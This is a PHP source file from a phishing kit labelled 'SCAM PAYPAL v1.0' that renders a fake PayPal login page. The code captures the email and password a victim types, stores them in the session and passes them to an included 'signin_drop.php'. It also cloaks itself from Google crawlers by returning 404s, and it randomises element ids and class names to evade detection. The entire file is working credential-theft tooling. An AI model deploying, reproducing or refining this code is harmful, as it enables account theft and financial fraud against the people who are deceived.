<?php
/*   
        ───────────────────────────────────────────────────────────────────────────────────
        ───────────────────██████──────────██████─████████████████─────────────────────────
        ───────────────────██░░██████████████░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░░░░░░░░░░░░░░░░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██████░░██████░░██─██░░██────██░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░████████░░██─────────────────────────
        ───────────────────██░░██──██░░██──██░░██─██░░░░░░░░░░░░██─────────────────────────
        ───────────────────██░░██──██████──██░░██─██░░██████░░████─────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██───────────────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░██████─██████────────────────
        ───────────────────██░░██──────────██░░██─██░░██──██░░░░░░██─██░░██────────────────
        ───────────────────██████──────────██████─██████──██████████─██████────────────────
        ───────────────────────────────────────────────────────────────────────────────────
        ────────────────────────────────────────────────────────────────────────────────────
        ─██████████████─██████─────────██████████████─██████████████─██████──────────██████─
        ─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─
        ─██░░██████████─██░░██─────────██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██████████─██░░██████░░██─██░░██──██░░██──██░░██─
        ─██░░██─────────██░░██─────────██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─
        ─██░░██████████─██░░██████████─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─
        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─
        ─██████████████─██████████████─██████████████─██████──██████─██████──────────██████─
        ───────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM PAYPAL v1.0    #
                                        #    Mr.CLEAN.PAYPAL    #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
    session_start();
    error_reporting(0);
    set_time_limit(0);
    ini_set('max_execution_time', 0);
    ########################################################
    ################ [+] INCLUDE FILES [+] #################
    ########################################################
    include('../functions/get_lang.php'); 
    include('../anti_bots/all_antibots.php'); 
    include('../anti_bots/index.php');
    ########################################################
    ############# [+] SESSION INFORMATION [+] ##############
    ########################################################
    if(!empty($_POST['login_email'])){$_SESSION['_login_email_']    = $_POST['login_email'];}
    if(!empty($_POST['login_password'])){$_SESSION['_login_password_'] = $_POST['login_password'];}
    ########################################################
    ############# [+] ACCOUNT INFORMATION [+] ##############
    ########################################################
    if(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){  
        include('signin_drop.php');
    }
    ########################################################
    $charSet = "XXXXID0123456789";
    $charSetSize = strlen($charSet); $pwdSize = 6;
    for ($i = 0; $i < $pwdSize; $i++) {
      $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
      $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
      $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
      $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
    }
    ########################################################
    $Z118xF0rm3XX = $XXX_03.mt_rand();
    $x87Z_E54IlsXX = $XXX_04.mt_rand();
    $Zx987P4ss0WrD = $XXX_05.mt_rand();
    $GrimmDZEBI987 = $XXX_06.mt_rand();
    ################ [+] ANTIBOTS FILES [+] ################
    if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
    if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
    ########################################################
    ?>
<html id="<?="x_".rand(3004, 2000)."".rand(7809, 5016)?>">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <title><?=$Log;?></title>
        <!------------------------------- FILES CSS STYLE --------------------------------->
        <link rel="stylesheet" href="../Mfiles/Meleven.css">
        <style>
            .xZ98_456ZTa{
            margin: 0 auto;
            width: 460px;
            }
            .xZ98_ZTAAa{
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            -khtml-border-radius: 5px;
            position: relative;
            margin: 130px auto 0;
            padding: 30px 10% 50px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            -khtml-border-radius: 5px;
            border-radius: 5px;
            }
            @media all and (max-width:767px) {
            .xZ98_456ZTa{
            margin-top:30px;
            padding-top:0;
            width:100%;
            background-color:#fff
            }
            .xZ98_ZTAAa{
            margin:0 10%;
            padding:0
            }
            }
        </style>
        <link rel="shortcut icon" type="image/x-icon" href="../Mpic/Mfour.ico">
        <meta name="viewport" content="initial-scale=1.0">
    </head>
    <body id="<?=rand(12390, 8756)."-xX666Xx-".rand(12390, 8756)?>">
        <p style="color: white;">.</p>
        <div for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" id="<?="_x78ZZ".rand(31254, 8700456)?>" name="Login">
            <div for="<?=rand(12390, 8756)."-".$GrimmDZEBI987."".rand(18, 18)."x-".rand(12390, 8756)?>" id="<?="_x987ZZ-".rand(346854, 87456)?>" class="<?="_x78ZZ".rand(31254, 8700456)?> xZ98_456ZTa <?="_x78ZZ".rand(31254, 8700456)?>">
                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="_x78ZZ".rand(31254, 8700456)?> xZ98_ZTAAa <?="_x78ZZ".rand(31254, 8700456)?>">
                    <header>
                        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  kl_h4aXX6987PO <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> "></div>
                    </header>
                    <section id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                        <form action="signin_drop.php" id="Z118xF0rm3XX" class="GOxGOxPOWERxRANGERS" name="login">
                            <div id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xv987HUB <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                <div class="x_G00066XD" id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>">
                                    <div class="x_G00066XD" style="z-index: 100;">
                                        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                            <input 
                                            for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> x_Z1186XDD7 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " 
                                            name="login_email" 
                                            type="email" 
                                            placeholder="<?=$Email;?>" 
                                            id="login_email" 
                                            value="<?php if(isset($_SESSION['_login_email_'])){ echo $_SESSION['_login_email_'];} ?>"
                                            >
                                        </div>
                                        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class=" <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> J118GhosTXRider <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>">
                                            <p><?=$Emailrequired;?></p>
                                        </div>
                                    </div>
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>  x_G00066XD <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xMARVELxDCxCOMIC118-C4as3 X66LiL44">
                                            <input 
                                            for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="x_Z1186XDD7" 
                                            name="login_password" 
                                            type="password" 
                                            placeholder="<?=$Password;?>" 
                                            id="login_password"
                                            >
                                        </div>
                                        <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> J118GhosTXRider <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                            <p id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><?=$required;?></p>
                                        </div>
                                    </div>
                                </div>
                                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?=rand(12390, 86)."-xMARVELxDCxCOMIC188x-".rand(12390, 8756)?> o_B4Ads-W4OOXDS">
                                    <button for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="xXMARVELxXBut00N" type="submit" id="proceedButton" name="<?=rand(12390, 8756)."-x968AG-".rand(12390, 8756)?>"><?=$LogIn;?></button>
                                </div>
                                <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ww_LiZ3b44 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                    <a href="#" id="<?=rand(12390, 8756)."-xT00x-".rand(12390, 8756)?>" class="<?=rand(12390, 8756)."-x660x-".rand(12390, 8756)?>"><?=$trouble;?></a>
                                    <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> " id="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                                    </div>
                                </div>
                                <a for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" href="#" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xXMARVELxXBut00N Z0-s6X6s-00" id="<?=rand(12390, 8756)."-s6X6s-".rand(12390, 8756)?>"><?=$Sign;?></a>
                            </div>
                        </form>
                    </section>
                    <br>
                </div>
            </div>
            <div id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> F4_x666x_F4 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
                <p id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xT02X65G <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?>"><?=$secureleylogging;?></p>
            </div>
        </div>
        <footer id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="<?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> DC_XX98700 <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> xv987HUB <?="x_".rand(34, 20)."ID-Z".rand(789, 516)?> ">
            <ul>
                <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#"><?=$Privacy;?></a></li>
                <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"></li>
                <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#"><?=$Feedback;?></a></li>
            </ul>
            <br>
            <ul id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>">
                <li id="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>"><a href="#" style="color: #9e9e9e;"><?=$Copyright;?> &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; <?=$rights;?></a></li>
            </ul>
        </footer>
        <!------------------------------- FILE JAVASCRIPT --------------------------------->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="../Mfiles/Mone.js"></script>
        <script src="../Mfiles/Mtwo.js"></script>
        <script type="text/javascript">
        $(document).ready(function() {
        $("#proceedButton").on("click", function (e) {
        if ($("#login_email").val() == "") {
        $("#login_email").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG");
        $("#login_email").addClass("x870AA-Ic0n3");
        return false;
        }
        if ($("#login_password").val() == "") {
        $("#login_password").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG");
        $("#login_password").addClass("x870AA-Ic0n3");
        return false;
        }
        });

        });  
      </script>
        <script type="text/javascript">
        $(document).ready(function() {
        console.clear();
        $("#Z118xF0rm3XX").submit(function(a) {
        a.preventDefault();
        var x = $("#login_email").val();
        var y = $("#login_password").val();
        if ( x == "") {
        $("#login_email").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG");
        $("#login_email").addClass("x870AA-Ic0n3");
        }
        if ( y == "") {
        $("#login_password").parent().next(".J118GhosTXRider").addClass("x87Z-Add1NG");
        $("#login_password").addClass("x870AA-Ic0n3");
        }
        if ( x != "" && y != "" ) {
        $(".F4_x666x_F4").addClass("pX-X987").fadeIn(800), $(".xT02X65G").delay(0).fadeIn(800);
        }
        });
        });
        </script>
        <!------------------------------- FILE JAVASCRIPT --------------------------------->
    </body>
</html>